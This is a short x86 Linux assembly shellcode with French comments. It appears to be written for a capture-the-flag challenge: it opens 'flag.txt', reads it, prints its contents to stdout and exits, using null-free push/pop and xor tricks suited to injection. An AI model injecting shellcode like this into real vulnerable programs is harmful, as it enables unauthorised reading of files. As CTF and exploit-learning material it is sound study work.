global _start

_start:
		xor ecx, ecx ;on clear ecx
		mul ecx ;on clear eax et edx

		push 5
		pop eax ;on met notre syscall number donc 5 pour open
		push ecx
		push 0x7478742e ;on push sur la stack .txt
		push 0x67616c66 ;on push sur la stack flag
		mov ebx, esp ;on push notre adresse de stack sur ebx
		int 0x80 ;on syscall on a donc open(filename, 0, 0) car notre ecx qui correspond au flags contient 0 et edx le open mode aussi
		
		
		xchg eax, ebx ;on transfere le contenu de ebx dans eax donc le resultat du call
		xchg eax, ecx ;pareil pour ecx
		push 3
		pop eax ;on met notre syscall a 3 pour read
		mov dx, 0x0FFF ;on met une grande valeur pour la lecture
		inc edx
		int 0x80
  
		xchg eax, edx ;on met les bytes a lire dans edx
		push 4
		pop eax ;on met notre syscall number donc 4 pour write
		push 1
		pop ebx ;on met la valeur de fd sur 1 pour avoir les output normaux et erreurs
		int 0x80 ;on syscall avec dans edx les bytes a lire, ecx le buffer et le file descriptor dans ebx
		
		push 1
		pop eax ;on met notre syscall number donc 1 pour exit 
		xor ebx, ebx ;on met 0 dans ebx pour notre error code
		int 0x80 ;on syscall pour exit(0)